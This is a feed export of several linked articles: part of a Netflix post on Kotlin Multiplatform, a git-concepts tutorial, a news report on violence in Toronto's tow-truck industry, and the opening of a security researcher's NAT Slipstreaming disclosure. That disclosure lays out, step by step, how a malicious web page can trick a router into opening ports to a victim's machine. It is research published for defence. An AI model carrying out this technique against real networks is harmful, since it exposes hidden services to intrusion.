&lt;p id=&quot;9e09&quot; class=&quot;fz ga cn gb b gc je ge gf gg jf gi gj gk jg gm gn go jh gq gr gs ji gu gv gw cf dk&quot;&gt;Of course, network connectivity may not always be available so downloaded rule sets need to be cached to disk. For this, we’re using &lt;a href=&quot;https://cashapp.github.io/sqldelight/&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;SQLDelight&lt;/a&gt; along with it’s Android and Native Database drivers for Multiplatform persistence&lt;strong class=&quot;gb kh&quot;&gt;.&lt;/strong&gt;&lt;/p&gt;

&lt;p id=&quot;9049&quot; class=&quot;fz ga cn gb b gc je ge gf gg jf gi gj gk jg gm gn go jh gq gr gs ji gu gv gw cf dk&quot;&gt;We’ve followed the evolution of Kotlin Multiplatform keenly over the last few years and believe that the technology has reached an inflection point. The tooling and build system integrations for Xcode have improved significantly such that the complexities involved in integration and maintenance are outweighed by the benefit of not having to write and maintain multiple platform specific implementations.&lt;/p&gt;
&lt;p id=&quot;eaac&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;Opportunities for additional code sharing between our Android and iOS studio apps are plentiful. Potential future applications of the technology become even more interesting when we consider that &lt;a href=&quot;https://kotlinlang.org/docs/reference/js-overview.html&quot; class=&quot;ef gx&quot; rel=&quot;noopener&quot;&gt;Javascript transpilation&lt;/a&gt; is also possible.&lt;/p&gt;
&lt;p id=&quot;65f5&quot; class=&quot;fz ga cn gb b gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs gt gu gv gw cf dk&quot;&gt;We’re excited by the possibility of evolving our studio mobile apps into thin UI layers with shared business logic and will continue to share our learnings with you on that journey.&lt;/p&gt;
</description>
<pubDate>Sun, 01 Nov 2020 09:52:19 +0000</pubDate>
<dc:creator>doppp</dc:creator>
<og:type>article</og:type>
<og:title>Netflix Android and iOS Studio Apps — now powered by Kotlin Multiplatform</og:title>
<og:description>By David Henry &amp; Mel Yahya</og:description>
<og:url>https://netflixtechblog.com/netflix-android-and-ios-studio-apps-kotlin-multiplatform-d6d4d8d25d23</og:url>
<og:image>https://miro.medium.com/max/1024/1*p4iArxP5Q8XEcBmDPHchtw.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://netflixtechblog.com/netflix-android-and-ios-studio-apps-kotlin-multiplatform-d6d4d8d25d23?gi=cd2dee1ba624</dc:identifier>
</item>
<item>
<title>Visualizing Git Concepts with D3</title>
<link>https://onlywei.github.io/explain-git-with-d3/</link>
<guid isPermaLink="true" >https://onlywei.github.io/explain-git-with-d3/</guid>
<description>&lt;div id=&quot;ExplainGitCommit-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;We are going to skip instructing you on how to add your files for commit in this explanation. Let's assume you already know how to do that. If you don't, go read some other tutorials.&lt;/p&gt;
&lt;p&gt;Pretend that you already have your files staged for commit and enter &lt;span class=&quot;cmd&quot;&gt;git commit&lt;/span&gt; as many times as you like in the terminal box.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitTag-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git tag name&lt;/span&gt; will create a new tag named &quot;name&quot;. Creating tags just creates a new tag pointing to the currently checked out commit.&lt;/p&gt;
&lt;p&gt;Tags can be deleted using the command &lt;span class=&quot;cmd&quot;&gt;git tag -d name&lt;/span&gt; (coming soon).&lt;/p&gt;
&lt;p&gt;Type &lt;span class=&quot;cmd&quot;&gt;git commit&lt;/span&gt; and &lt;span class=&quot;cmd&quot;&gt;git tag&lt;/span&gt; commands to your hearts desire until you understand this concept.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitBranch-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git branch name&lt;/span&gt; will create a new branch named &quot;name&quot;. Creating branches just creates a new tag pointing to the currently checked out commit.&lt;/p&gt;
&lt;p&gt;Branches can be deleted using the command &lt;span class=&quot;cmd&quot;&gt;git branch -d name&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;Type &lt;span class=&quot;cmd&quot;&gt;git commit&lt;/span&gt; and &lt;span class=&quot;cmd&quot;&gt;git branch&lt;/span&gt; commands to your hearts desire until you understand this concept.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitCheckout-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;23&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git checkout&lt;/span&gt; has many uses, but the main one is to switch between branches.&lt;br /&gt;For example, to switch from master branch to dev branch, I would type &lt;span class=&quot;cmd&quot;&gt;git checkout dev&lt;/span&gt;. After that, if I do a git commit, notice where it goes. Try it.&lt;/p&gt;
&lt;p&gt;In addition to checking out branches, you can also checkout individual commits. Try it.&lt;br /&gt;Make a new commit and then type &lt;span class=&quot;cmd&quot;&gt;git checkout bb92e0e&lt;/span&gt; and see what happens.&lt;/p&gt;
&lt;p&gt;Type &lt;span class=&quot;cmd&quot;&gt;git commit&lt;/span&gt;, &lt;span class=&quot;cmd&quot;&gt;git branch&lt;/span&gt;, and &lt;span class=&quot;cmd&quot;&gt;git checkout&lt;/span&gt; commands to your hearts desire until you understand this concept.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitCheckout-b-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;You can combine &lt;span class=&quot;cmd&quot;&gt;git branch&lt;/span&gt; and &lt;span class=&quot;cmd&quot;&gt;git checkout&lt;/span&gt; into a single command by typing &lt;span class=&quot;cmd&quot;&gt;git checkout -b branchname&lt;/span&gt;. This will create the branch if it does not already exist and immediately check it out.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitReset-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;25.887201735358&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git reset&lt;/span&gt; will move HEAD and the current branch back to wherever you specify, abandoning any commits that may be left behind. This is useful to undo a commit that you no longer need.&lt;/p&gt;
&lt;p&gt;This command is normally used with one of three flags: &quot;--soft&quot;, &quot;--mixed&quot;, and &quot;--hard&quot;. The soft and mixed flags deal with what to do with the work that was inside the commit after you reset, and you can read about it &lt;a href=&quot;http://git-scm.com/2011/07/11/reset.html&quot;&gt;here&lt;/a&gt;. Since this visualization cannot graphically display that work, only the &quot;--hard&quot; flag will work on this site.&lt;/p&gt;
&lt;p&gt;The ref &quot;HEAD^&quot; is usually used together with this command. &quot;HEAD^&quot; means &quot;the commit right before HEAD. &quot;HEAD^^&quot; means &quot;two commits before HEAD&quot;, and so on.&lt;/p&gt;
&lt;p&gt;Note that you must &lt;strong&gt;never&lt;/strong&gt; use &lt;span class=&quot;cmd&quot;&gt;git reset&lt;/span&gt; to abandon commits that have already been pushed and merged into the origin. This can cause your local repository to become out of sync with the origin. Don't do it unless you really know what you're doing.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitRevert-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;To undo commits that have already been pushed and shared with the team, we cannot use the &lt;span class=&quot;cmd&quot;&gt;git reset&lt;/span&gt; command. Instead, we have to use &lt;span class=&quot;cmd&quot;&gt;git revert&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git revert&lt;/span&gt; will create a new commit that will undo all of the work that was done in the commit you want to revert.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitMerge-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git merge&lt;/span&gt; will create a new commit with two parents. The resulting commit snapshot will have the all of the work that has been done in both branches.&lt;/p&gt;
&lt;p&gt;If there was no divergence between the two commits, git will do a &quot;fast-forward&quot; method merge.&lt;br /&gt;To see this happen, checkout the 'ff' branch and then type &lt;span class=&quot;cmd&quot;&gt;git merge dev&lt;/span&gt;.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitRebase-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;18&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git rebase&lt;/span&gt; will take the commits on this branch and &quot;move&quot; them so that their new &quot;base&quot; is at the point you specify.&lt;/p&gt;
&lt;p&gt;You should pay close attention to the commit IDs of the circles as they move when you do this exercise.&lt;/p&gt;
&lt;p&gt;The reason I put &quot;move&quot; in quotations because this process actually generates brand new commits with completely different IDs than the old commits, and leaves the old commits where they were. For this reason, you never want to rebase commits that have already been shared with the team you are working with.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitFetch-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git fetch&lt;/span&gt; will update all of the &quot;remote tracking branches&quot; in your local repository. Remote tracking branches are tagged in grey.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitPull-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;16&quot;&gt;
&lt;p&gt;A &lt;span class=&quot;cmd&quot;&gt;git pull&lt;/span&gt; is a two step process that first does a &lt;span class=&quot;cmd&quot;&gt;git fetch&lt;/span&gt;, and then does a &lt;span class=&quot;cmd&quot;&gt;git merge&lt;/span&gt; of the remote tracking branch associated with your current branch. If you have no current branch, the process will stop after fetching.&lt;/p&gt;
&lt;p&gt;If the argument &quot;--rebase&quot; was given by typing &lt;span class=&quot;cmd&quot;&gt;git pull --rebase&lt;/span&gt;, the second step of pull process will be a rebase instead of a merge. This can be set to the default behavior by configuration by typing: &lt;span class=&quot;cmd&quot;&gt;git config branch.BRANCHNAME.rebase true&lt;/span&gt;.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitPush-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;16&quot;&gt;
&lt;p&gt;A &lt;span class=&quot;cmd&quot;&gt;git push&lt;/span&gt; will find the commits you have on your local branch that the corresponding branch on the origin server does not have, and send them to the remote repository.&lt;/p&gt;
&lt;p&gt;By default, all pushes must cause a fast-forward merge on the remote repository. If there is any divergence between your local branch and the remote branch, your push will be rejected. In this scenario, you need to pull first and then you will be able to push again.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitClean-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;12&quot;&gt;
&lt;p&gt;One simple example of the use of &lt;span class=&quot;cmd&quot;&gt;git reset&lt;/span&gt; is to completely restore your local repository state to that of the origin.&lt;br /&gt;You can do so by typing &lt;span class=&quot;cmd&quot;&gt;git reset origin/master&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;Note that this won't delete untracked files, you will have to delete those separately with the command &lt;span class=&quot;cmd&quot;&gt;git clean -df&lt;/span&gt;.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitFetchRebase-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;13&quot;&gt;
&lt;p&gt;Below is a situation in which you are working in a local branch that is all your own. You want to receive the latest code from the origin server's master branch. To update your local branch, you can do it without having to switch branches!&lt;/p&gt;
&lt;p&gt;First do a &lt;span class=&quot;cmd&quot;&gt;git fetch&lt;/span&gt;, then type &lt;span class=&quot;cmd&quot;&gt;git rebase origin/master&lt;/span&gt;!&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitDeleteBranches-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span class=&quot;cmd&quot;&gt;git branch -d&lt;/span&gt; is used to delete branches. I have pre-created a bunch of branches for you to delete in the playground below. Have at it.&lt;/p&gt;

&lt;/div&gt;
&lt;div id=&quot;ExplainGitFree-Container&quot; class=&quot;twelvecol concept-container&quot; readability=&quot;7&quot;&gt;
&lt;p&gt;Do whatever you want in this free playground.&lt;/p&gt;

&lt;/div&gt;
</description>
<pubDate>Sun, 01 Nov 2020 04:43:47 +0000</pubDate>
<dc:creator>gilad</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://onlywei.github.io/explain-git-with-d3/</dc:identifier>
</item>
<item>
<title>Toronto-area lawyer had to flee Canada after taking on the tow truck industry</title>
<link>https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869</link>
<guid isPermaLink="true" >https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869</guid>
<description>&lt;p&gt;TORONTO -- Lisa Carr never thought her work would lead to armed threats, a firebombing, a shooting and a conspiracy to kill her.&lt;/p&gt;
&lt;p&gt;The Carr Law office is in a nondescript strip mall in Vaughan, Ont., north of Toronto. It’s closed now, after the litigation lawyer says police told her they could no longer protect her.&lt;/p&gt;
&lt;p&gt;She was shuttled to another country where she spent five long months in hiding. Carr has never before told her story, but agreed to meet for an interview as part of a W5 investigation into the shady underbelly of an industry that forced her to give up her business and almost cost her, her life: The tow truck industry.&lt;/p&gt;
&lt;p&gt;Over the last number of years, criminal elements have been battling for lucrative control of the major highways around the Toronto area. It has resulted in more than 50 arsons, multiple shootings and at least four murders.&lt;/p&gt;
&lt;p&gt;So why is there so much violence over a couple of hundred-dollar tows at the side of the road? Because that one tow can net tens of thousands of dollars.&lt;/p&gt;
&lt;p&gt;Here’s how it works: The tow truck driver gets a kickback from an unscrupulous auto body shop, which then submits wildly inflated repair fees to an insurance company.&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;york police&quot; src=&quot;https://www.ctvnews.ca/polopoly_fs/1.4954903!/httpImage/image.jpg_gen/derivatives/landscape_960/image.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The insurance industry estimates that fake repair bills tally up to $2 billion a year in Canada. And that’s why Carr was in the crosshairs. She was hired by an insurance company to challenge bogus claims.&lt;/p&gt;
&lt;p&gt;Over the course of a number of months, Carr’s law firm was the target of increasingly violent attacks. First a firebombing and then her office was set on fire.&lt;/p&gt;
&lt;p&gt;Months later, in broad daylight, a colleague leaving work had a gun put to her head and was told, “Stop suing our friends.” Shortly after that, again in broad daylight, someone opened fire through the front door of the busy office.&lt;/p&gt;
&lt;p&gt;Carr says it is incredible no one was struck by the flurry of bullets.&lt;/p&gt;
&lt;p&gt;“I looked down the hall and I saw my receptionist on her hands and knees surrounded by glass. And one of the other girls came running at me saying, ‘Shots fired, shots fired. Call 911.’”&lt;/p&gt;
&lt;p&gt;While the violence surrounding the tow truck industry has made headlines in the Greater Toronto Area, the story that has never been told is that York Regional Police (YRP) uncovered a plot to kill Carr.&lt;/p&gt;
&lt;p&gt;It was such a credible threat that they gave her an hour to pack up her belongings and leave her home. Carr and her husband were then whisked out of the country and spent five months in hiding.&lt;/p&gt;
&lt;p&gt;Three separate police services – YRP, Toronto Police Service and Ontario Provincial Police – joined forces to launch Project Platinum to investigate the violence associated with the tow truck industry.&lt;/p&gt;
&lt;p&gt;They carried out a series of raids this past spring, which netted dozens of high-powered weapons and led to the arrests of 35 people who face almost 500 charges, including the attempted murder of Carr.&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;weapon&quot; src=&quot;https://www.ctvnews.ca/polopoly_fs/1.4954983!/httpImage/image.jpg_gen/derivatives/landscape_960/image.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Now back in Canada, Carr says police have told her she is likely no longer in danger, but with one caveat.&lt;/p&gt;
&lt;p&gt;“The police said we believe the risk is low. As long as you don't go back to work, as long as you don't restart the firm,” she says.&lt;/p&gt;
&lt;p&gt;“So they have effectively ended my career. We lost everything. They won.”&lt;/p&gt;
</description>
<pubDate>Sun, 01 Nov 2020 04:20:51 +0000</pubDate>
<dc:creator>walterbell</dc:creator>
<og:type>article</og:type>
<og:title>This Toronto-area lawyer had to flee the country after taking on the tow truck industry</og:title>
<og:description>There have been dozens of arsons, shootings and at least four murders connected to the tow truck industry in the Toronto area. W5 investigates the underbelly of the industry and shares the story of a lawyer who took it on.</og:description>
<og:url>https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869</og:url>
<og:image>https://www.ctvnews.ca/polopoly_fs/1.5167953.1604071341!/httpImage/image.jpg_gen/derivatives/landscape_620/image.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869</dc:identifier>
</item>
<item>
<title>NAT Slipstreaming</title>
<link>https://samy.pl/slipstream/</link>
<guid isPermaLink="true" >https://samy.pl/slipstream/</guid>
<description>&lt;head&gt;&lt;meta property=&quot;og:title&quot; content=&quot;Samy Kamkar - NAT Slipstreaming&quot;/&gt;&lt;meta property=&quot;og:description&quot; content=&quot;exploit NAT/firewalls to access TCP/UDP services bound on a victim machine&quot;/&gt;&lt;meta property=&quot;og:image&quot; content=&quot;http://samy.pl/slipstream/img/slipstreambl.png&quot;/&gt;&lt;meta property=&quot;og:url&quot; content=&quot;http://samy.pl/slipstream/&quot;/&gt;&lt;meta charset=&quot;utf-8&quot;/&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, user-scalable=yes&quot;/&gt;&lt;title&gt;Samy Kamkar - NAT Slipstreaming&lt;/title&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;568.45278609092&quot;&gt;


&lt;p&gt;&lt;a href=&quot;https://samy.pl/slipstream/&quot;&gt;NAT Slipstreaming&lt;/a&gt; allows an attacker to remotely access any TCP/UDP service bound to a victim machine, bypassing the victim's NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Developed by&lt;/strong&gt;: &lt;a target=&quot;_blank&quot; href=&quot;https://twitter.com/samykamkar&quot;&gt;@SamyKamkar&lt;/a&gt; // &lt;a target=&quot;_blank&quot; href=&quot;https://samy.pl&quot;&gt;https://samy.pl&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Released&lt;/strong&gt;: October 31 &lt;a href=&quot;https://samy.pl/slipstream/#&quot; onmouseover=&quot;spooky()&quot;&gt;👻&lt;/a&gt; 2020&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Source code&lt;/strong&gt;: &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/slipstream&quot;&gt;https://github.com/samyk/slipstream&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img id=&quot;mimg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;animation generated with my &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/drawio&quot;&gt;fork&lt;/a&gt; of &lt;a target=&quot;_blank&quot; href=&quot;https://draw.io&quot;&gt;draw.io&lt;/a&gt;, allowing exportable edge context flow &amp;amp; control in animations&lt;/em&gt;&lt;/p&gt;


&lt;p&gt;NAT Slipstreaming exploits the user's browser in conjunction with the Application Level Gateway (ALG) connection tracking mechanism built into NATs, routers, and firewalls by chaining internal IP extraction via timing attack or WebRTC, automated remote MTU and IP fragmentation discovery, TCP packet size massaging, TURN authentication misuse, precise packet boundary control, and protocol confusion through browser abuse. As it's the NAT or firewall that opens the destination port, this bypasses any browser-based port restrictions.&lt;/p&gt;
&lt;p&gt;This attack takes advantage of arbitrary control of the data portion of some TCP and UDP packets &lt;em&gt;without&lt;/em&gt; including HTTP or other headers; the attack performs this new packet injection technique across all major modern (and older) browsers, and is a modernized version to my original &lt;a target=&quot;_blank&quot; href=&quot;https://samy.pl/natpin/&quot;&gt;NAT Pinning technique from 2010&lt;/a&gt; (presented at DEFCON 18 + Black Hat 2010). Additionally, new techniques for local IP address discovery are included.&lt;/p&gt;
&lt;p&gt;This attack requires the NAT/firewall to support ALG (Application Level Gateways), which are mandatory for protocols that can use multiple ports (control channel + data channel) such as SIP and H323 (VoIP protocols), FTP, IRC DCC, etc.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;At a high level, NAT Slipstreaming works like so:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;victim visits malicious site (or site with malicious advertisement)&lt;/li&gt;
&lt;li&gt;internal IP of victim first must be extracted by browser and sent to server
&lt;ul&gt;&lt;li&gt;internal IP attempted to be extracted via &lt;a target=&quot;_blank&quot; href=&quot;https://www.w3.org/TR/webrtc/&quot;&gt;WebRTC&lt;/a&gt; data channel over https&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;&lt;li&gt;some browsers (Chrome) only divulge the local IP via WebRTC over HTTPS but some of our attacks require HTTP so we first redirect to the HTTPS version of the attack software to extract the local IP&lt;/li&gt;
&lt;li&gt;we then redirect to the HTTP version with the local IP included in the URL if we were able to obtain it to bypass other cross-origin protection mechanisms (the &lt;code&gt;.local&lt;/code&gt; mDNS/Bonjour address presented will not be useful for the attack)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;if internal IP not divulged by WebRTC (Safari) or no WebRTC (&amp;lt;= IE11), &lt;strong&gt;web-based TCP timing attack performed&lt;/strong&gt;
&lt;ul&gt;&lt;li&gt;hidden &lt;code&gt;img&lt;/code&gt; tags to all common gateways (eg &lt;code&gt;192.168.0.1&lt;/code&gt;) are loaded in background&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onerror/onsuccess&lt;/code&gt; events attached to &lt;code&gt;img&lt;/code&gt; tags&lt;/li&gt;
&lt;li&gt;if any TCP RST (oneror) returned by gateway, or SYN + HTTP response (onsuccess), within a few seconds (before TCP timeout triggers onerror), we've detected valid subnet&lt;/li&gt;
&lt;li&gt;re-perform timing attack across all IPs on detected subnets (/24), measuring time to onerror/onsuccess firing&lt;/li&gt;
&lt;li&gt;fastest response is likely internal IP, though all responses are considered victim internal IP candidates and attacked&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;large TCP beacon sent via hidden form and automatic HTTP POST to attacker &quot;HTTP server&quot; bound to a non-standard port to force TCP segmentation and maximum MTU size discovery of the victim's IP stack
&lt;ul&gt;&lt;li&gt;attacker TCP server sends &lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc793#section-3.1&quot;&gt;Maximum Segment Size&lt;/a&gt; TCP Option to massage victim outbound packet sizes (&lt;a target=&quot;_blank&quot; href=&quot;https://tools.ietf.org/html/rfc793#section-3.1&quot;&gt;RFC 793 x3.1&lt;/a&gt;), allowing control of how large browser TCP packets will be&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;large UDP beacon sent from browser via WebRTC TURN authentication mechanism to non-standard port to attacker's server to force IP fragmentation with TURN &lt;code&gt;username&lt;/code&gt; field stuffed
&lt;ul&gt;&lt;li&gt;we perform a similar attack as our TCP segmentation, but over UDP as IP fragmentation will occur and provide different values than TCP segmentation&lt;/li&gt;
&lt;li&gt;victim MTU size, IP header size, IP packet size, TCP header size, TCP segment sizes detected by server and sent back to victim's browser, used later for packet stuffing&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&quot;SIP packet&quot; in new hidden form generated, containing internal IP to trigger Application Level Gateway connection tracking
&lt;ul&gt;&lt;li&gt;&quot;HTTP POST&quot; to server on TCP port 5060 (SIP port) initiated, avoiding &lt;a target=&quot;_blank&quot; href=&quot;https://github.com/samyk/chromium/blob/2d57e5b8afc6d01b344a8d95d3470d46b35845c5/net/base/port_util.cc#L20-L90&quot;&gt;restricted browser ports&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;POST data is &quot;stuffed&quot; to exact TCP segment size / packet boundary, then “SIP packet” appended and posted via web form&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;victim IP stack breaks the POST into multiple TCP packets, leaving the &quot;SIP packet&quot; (as part of POST data) in its own TCP packet without any accompanying HTTP headers&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;if browser alters size of multipart/form boundary (Firefox) or packet size changes for any other reason, size change is communicated back to client and client auto-resends with new size&lt;/li&gt;
&lt;li&gt;when opening UDP port, SIP packet is sent over TURN protocol inside specially crafted &lt;code&gt;username&lt;/code&gt; field forcing IP fragmentation and precise boundary control&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;victim NAT sees proper SIP REGISTER packet on SIP port (with no HTTP data), triggering ALG to open any TCP/UDP port defined in packet back to victim
&lt;ul&gt;&lt;li&gt;victim NAT rewrites SIP packet, replacing internal IP with public IP, hinting to attacker exploit was successful&lt;/li&gt;
&lt;li&gt;even if victim NAT normally rewrites source ports, the ALG will still be forced to port forward to the attacker's port of choice as it believes victim machine opened that port and attacker sees new source port in arriving SIP packet&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;attacker can now bypass victim NAT and connect directly back to any port on victim's machine, exposing previously protected/hidden services&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/pinpkt2.png&quot;&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/pinpkt2.png&quot; alt=&quot;successful packet broken into valid SIP packet&quot;/&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;network-address-translation-nat&quot;&gt;Network Address Translation (NAT)&lt;/h2&gt;
&lt;p&gt;We use NATs (Network Address Translation) for several reasons. The most useful feature of NAT is that it allows a single public IP address to be shared among multiple systems. It does this by creating a local network, providing local IP addresses to all machines that connect, and when one of those systems reaches out to the Internet, it rewrites packets going out to use the public IP so responses come back to the NAT, and vice versa, rewriting desination IP to specific client's IP.&lt;/p&gt;
&lt;p&gt;It's the responsibility of the NAT to differentiate connections to the same addresses/ports (google.com:443) from internal hosts as ultimately their outbound port, destination ip and source ip will all be the same. If two different internal peers attempt to connect from the same source port, modern NATs will alter one of the source ports (some networks do this to all TCP/UDP source ports).&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/samyk/slipstream/main/img/lan.png&quot; alt=&quot;NAT&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;connection-tracking&quot;&gt;Connection Tracking&lt;/h3&gt;
&lt;p&gt;From &lt;a target=&quot;_blank&quot; href=&quot;https://www.wikiwand.com/en/Netfilter&quot;&gt;Wikipedia ala Wikiwand&lt;/a&gt;:&lt;/p&gt;
&lt;div readability=&quot;12&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-none&quot;&gt;One of the important features built on top of the Netfilter 
framework is connection tracking. Connection tracking 
allows the kernel to keep track of all logical network 
connections or sessions, and thereby relate all of the packets
which may make up that connection. NAT relies on this 
information to translate all related packets in the same way, 
and iptables can use this information to act as a stateful 
firewall.&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If a machine behind your NAT sends a packet out and your router expects the remote host may respond, it keeps track of information, specifically the source and destination ports, source and destination IP addresses, and your internal IP, then returns any packets matching it back to your internal IP.&lt;/p&gt;
&lt;p&gt;If another host on your LAN attempts to make the same connection with the same source and destination ports + IPs, your NAT wouldn't be able to discriminate it (the source IPs are different on your LAN but are rewritten to the same public IP on the WAN side), so it alters the source port, but rewrites it when sending back to you.&lt;/p&gt;
&lt;h3 id=&quot;application-level-gateway&quot;&gt;Application Level Gateway&lt;/h3&gt;
&lt;p&gt;ALGs allow NAT to track a multi-port protocol like FTP to go out from your system to an FTP server, then track when you request a file to be sent to your internal IP on a specific port, the ALG can rewrite the packet to include your public IP, then forward the FTP's server connection back to you. Had it not rewritten your IP, the FTP server would try to connect back to you on your internal IP (or not try at all if it expects the source IP to be the same as the signaling connection).&lt;/p&gt;
&lt;p&gt;From &lt;a target=&quot;_blank&quot; href=&quot;https://www.wikiwand.com/en/Application-level_gateway&quot;&gt;Wikipedia&lt;/a&gt;:&lt;/p&gt;
&lt;div readability=&quot;18&quot;&gt;
&lt;pre&gt;
&lt;code class=&quot;language-none&quot;&gt;In the context of computer networking, an application-level 
gateway consists of a security component that augments a 
firewall or NAT employed in a computer network. It allows 
customized NAT traversal filters to be plugged into the 
gateway to support address and port translation for certain 
application layer &quot;control/data&quot; protocols such as FTP, 
BitTorrent, SIP, RTSP, file transfer in IM applications, etc. 
In order for these protocols to work through NAT or a 
firewall, either the application has to know about an address/
port number combination that allows incoming packets, or the 
NAT has to monitor the control traffic and open up port 
mappings (firewall pinhole) dynamically as required. 
Legitimate application data can thus be passed through the 
security checks of the firewall or NAT that would have 
otherwise restricted the traffic for not meeting its limited 
filter criteria.&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;router-investigation--firmware-dumping&quot;&gt;Router Investigation / Firmware Dumping&lt;/h2&gt;
&lt;p&gt;I'd first like to see how common gateways actually treat packets and multi-port protocols like FTP, SIP, etc. To do this, we’ll want to reverse engineer the firmware from common routers. We could dump the flash from physical routers, however if we can get unencrypted firmware from the manufacturers, we’ll be able to investigate more router models and much faster.&lt;/p&gt;
